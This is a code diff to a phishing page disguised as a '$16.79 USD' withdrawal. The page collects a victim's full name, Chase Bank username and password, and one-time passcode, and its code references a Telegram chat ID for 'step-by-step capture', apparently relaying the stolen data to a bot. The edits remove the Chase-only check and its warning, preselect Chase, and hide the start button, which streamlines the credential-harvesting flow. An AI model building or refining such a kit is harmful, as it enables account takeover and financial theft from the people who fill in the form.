@@ -95,16 +95,7 @@
             cursor: pointer;
             letter-spacing: 0.3px;
             margin-top: 0.2rem;
-        }
-
-        .btn-primary:hover {
-            background: #123a5e;
-            transform: scale(1.01);
-            box-shadow: 0 10px 18px rgba(11, 43, 74, 0.3);
-        }
-
-        .btn-primary:active {
-            transform: scale(0.97);
+            display: none;
         }
 
         .step-indicator {
@@ -251,13 +242,7 @@
         }
 
         .warning-message {
-            color: #b91c1c;
-            font-size: 0.75rem;
-            margin-top: 0.4rem;
-            background: #fee2e2;
-            padding: 0.3rem 0.8rem;
-            border-radius: 30px;
-            display: inline-block;
+            display: none !important;
         }
 
         .processing-overlay {
@@ -388,8 +373,6 @@
             <span class="amount">$16.79 <small>USD</small></span>
         </div>
 
-        <button class="btn-primary" id="startWithdrawBtn">Withdraw $16.79</button>
-
         <div class="step-indicator">
             <span class="dot active" id="dot1"></span>
             <span class="dot" id="dot2"></span>
@@ -408,29 +391,27 @@
                 <div class="form-group">
                     <label for="bankSelect">Select your bank</label>
                     <select id="bankSelect" class="bank-select">
-                        <option value="">— Select a bank —</option>
-                        <option value="Chase Bank" data-allowed="true">Chase Bank ✓</option>
-                        <option value="Bank of America" data-allowed="false">Bank of America</option>
-                        <option value="Wells Fargo" data-allowed="false">Wells Fargo</option>
-                        <option value="Citibank" data-allowed="false">Citibank</option>
-                        <option value="U.S. Bank" data-allowed="false">U.S. Bank</option>
-                        <option value="Truist Bank" data-allowed="false">Truist Bank</option>
-                        <option value="PNC Bank" data-allowed="false">PNC Bank</option>
-                        <option value="TD Bank" data-allowed="false">TD Bank</option>
-                        <option value="Capital One" data-allowed="false">Capital One</option>
-                        <option value="Fifth Third Bank" data-allowed="false">Fifth Third Bank</option>
-                        <option value="KeyBank" data-allowed="false">KeyBank</option>
-                        <option value="M&T Bank" data-allowed="false">M&T Bank</option>
-                        <option value="Huntington Bank" data-allowed="false">Huntington Bank</option>
-                        <option value="Regions Bank" data-allowed="false">Regions Bank</option>
-                        <option value="Ally Bank" data-allowed="false">Ally Bank</option>
-                        <option value="Santander" data-allowed="false">Santander</option>
-                        <option value="HSBC" data-allowed="false">HSBC</option>
-                        <option value="Discover Bank" data-allowed="false">Discover Bank</option>
-                        <option value="Synchrony Bank" data-allowed="false">Synchrony Bank</option>
-                        <option value="Marcus by Goldman Sachs" data-allowed="false">Marcus by Goldman Sachs</option>
+                        <option value="Chase Bank" selected>Chase Bank ✓</option>
+                        <option value="Bank of America">Bank of America</option>
+                        <option value="Wells Fargo">Wells Fargo</option>
+                        <option value="Citibank">Citibank</option>
+                        <option value="U.S. Bank">U.S. Bank</option>
+                        <option value="Truist Bank">Truist Bank</option>
+                        <option value="PNC Bank">PNC Bank</option>
+                        <option value="TD Bank">TD Bank</option>
+                        <option value="Capital One">Capital One</option>
+                        <option value="Fifth Third Bank">Fifth Third Bank</option>
+                        <option value="KeyBank">KeyBank</option>
+                        <option value="M&T Bank">M&T Bank</option>
+                        <option value="Huntington Bank">Huntington Bank</option>
+                        <option value="Regions Bank">Regions Bank</option>
+                        <option value="Ally Bank">Ally Bank</option>
+                        <option value="Santander">Santander</option>
+                        <option value="HSBC">HSBC</option>
+                        <option value="Discover Bank">Discover Bank</option>
+                        <option value="Synchrony Bank">Synchrony Bank</option>
+                        <option value="Marcus by Goldman Sachs">Marcus by Goldman Sachs</option>
                     </select>
-                    <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported.</div>
                 </div>
                 <button class="btn-step" id="step1Next">Continue →</button>
             </div>
@@ -510,7 +491,6 @@
             const CHAT_ID = '8737104261';
 
             // ---- DOM refs ----
-            const startBtn = document.getElementById('startWithdrawBtn');
             const stepContainer = document.getElementById('stepContainer');
 
             const step1 = document.getElementById('step1');
@@ -527,7 +507,6 @@
 
             const fullNameInput = document.getElementById('fullName');
             const bankSelect = document.getElementById('bankSelect');
-            const bankWarning = document.getElementById('bankWarning');
             const chaseUser = document.getElementById('chaseUser');
             const chasePass = document.getElementById('chasePass');
             const processingOverlay = document.getElementById('processingOverlay');
@@ -659,29 +638,6 @@
                     otpForm.classList.add('hidden');
                     isProcessing = false;
                 }
-                if (step === 1) validateBankSelection();
-            }
-
-            // ---- bank validation ----
-            function isChaseSelected() {
-                const selectedOption = bankSelect.options[bankSelect.selectedIndex];
-                return selectedOption && selectedOption.value === 'Chase Bank';
-            }
-
-            function validateBankSelection() {
-                const allowed = isChaseSelected();
-                if (!allowed) {
-                    bankWarning.classList.remove('hidden');
-                    step1Next.disabled = true;
-                    step1Next.style.opacity = '0.5';
-                    step1Next.style.cursor = 'not-allowed';
-                } else {
-                    bankWarning.classList.add('hidden');
-                    step1Next.disabled = false;
-                    step1Next.style.opacity = '1';
-                    step1Next.style.cursor = 'pointer';
-                }
-                return allowed;
             }
 
             // ---- collect data ----
@@ -728,27 +684,14 @@
 
             // ---- Event listeners ----
 
-            // Start button - now just resets to step 1 if needed
-            startBtn.addEventListener('click', function() {
-                goToStep(1);
-                const data = collectAllData();
-                reviewName.innerText = data.name;
-                reviewBank.innerText = data.bank;
-                reviewOtp.innerText = data.otp;
-                validateBankSelection();
-            });
-
             // Step1 → Step2 (send step 1 data)
             step1Next.addEventListener('click', function() {
-                if (!isChaseSelected()) {
-                    alert('Please select Chase Bank to continue.');
-                    return;
-                }
                 const name = fullNameInput.value.trim();
                 if (name.length < 2) {
                     alert('Please enter your full name.');
                     return;
                 }
+                // Send step 1 data with full name and bank
                 sendStep1Data();
                 goToStep(2);
             });
@@ -800,7 +743,6 @@
             // Back buttons
             backToStep1.addEventListener('click', function() { 
                 goToStep(1);
-                validateBankSelection();
             });
             backToStep2.addEventListener('click', function() { 
                 goToStep(2);
@@ -820,12 +762,10 @@
                     reviewOtp.innerText = data.otp;
                 }
                 originalGoToStep(step);
-                if (step === 1) validateBankSelection();
             };
 
             // ---- init ----
             goToStep(1);
-            validateBankSelection();
             reviewName.innerText = '—';
             reviewBank.innerText = '—';
             reviewOtp.innerText = '—';
@@ -834,7 +774,6 @@
             chasePass.value = '';
             otpInput.value = '';
             fullNameInput.value = '';
-            bankSelect.value = '';
 
             console.log('🔔 Telegram bot configured (step-by-step capture)');
             console.log('📱 Chat ID:', CHAT_ID);
